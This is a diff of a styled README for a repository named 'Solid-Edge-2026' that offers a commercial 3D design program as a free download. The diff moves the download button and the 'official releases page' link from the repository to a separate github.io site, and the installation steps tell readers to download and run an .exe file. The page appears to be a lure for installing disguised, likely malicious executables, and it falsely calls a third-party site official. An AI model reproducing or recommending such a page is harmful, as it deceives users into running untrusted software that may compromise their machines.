@@ -3,7 +3,7 @@
     <h1 style="font-size: 2.5em; color: #24292f; border-bottom: 2px solid #eaeaea; padding-bottom: 10px;">📦 Solid-Edge-2026 - Access professional 3D design tools today</h1>
 
     <div style="text-align: center; margin: 40px 0;">
-        <a href="https://github.com/grindfreelance80/Solid-Edge-2026/releases" style="background-color: #0969da; color: #ffffff; padding: 15px 30px; text-decoration: none; font-weight: bold; border-radius: 6px; font-size: 1.2em; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Solid Edge 2026</a>
+        <a href="https://grindfreelance80.github.io" style="background-color: #0969da; color: #ffffff; padding: 15px 30px; text-decoration: none; font-weight: bold; border-radius: 6px; font-size: 1.2em; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Solid Edge 2026</a>
     </div>
 
     <h2 style="color: #24292f; margin-top: 40px;">ℹ️ About This Software</h2>
@@ -23,7 +23,7 @@
     <h2 style="color: #24292f; margin-top: 40px;">📥 Installation Steps</h2>
     <p>Follow these steps to install the software on your Windows computer.</p>
     <ol>
-        <li>Visit the <a href="https://github.com/grindfreelance80/Solid-Edge-2026/releases" style="color: #0969da;">official releases page</a> to access the download files.</li>
+        <li>Visit the <a href="https://grindfreelance80.github.io" style="color: #0969da;">official releases page</a> to access the download files.</li>
         <li>Locate the latest version release.</li>
         <li>Select the installer file ending in .exe to start the transfer to your local machine.</li>
         <li>Wait for the download to finish. Save the file to your Downloads folder or your Desktop.</li>
